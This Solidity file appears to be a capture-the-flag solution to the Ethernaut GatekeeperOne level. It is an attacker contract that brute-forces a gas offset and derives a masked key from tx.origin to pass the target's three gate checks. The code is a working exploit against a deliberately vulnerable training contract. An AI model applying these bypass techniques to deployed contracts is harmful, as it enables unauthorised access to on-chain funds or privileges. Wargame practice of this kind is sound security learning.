// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external returns (address);
}

contract Cracked13_GatekeeperOne {
    address ethernaut_contracts;

    constructor(address _address) {
        ethernaut_contracts = _address;
    }
    function enter(uint256 num) external returns (bool) {
        require(num <= 8191, "num too big");
        //819100 + 414 + 538 + 2 gasleft
        (bool res, ) = ethernaut_contracts.call{gas: 819100 + num}(abi.encodeWithSignature("enter(bytes8)", (bytes8(uint64(uint160(tx.origin))) & 0x0000FFFF0000FFFF)));
        return res;
    }
}
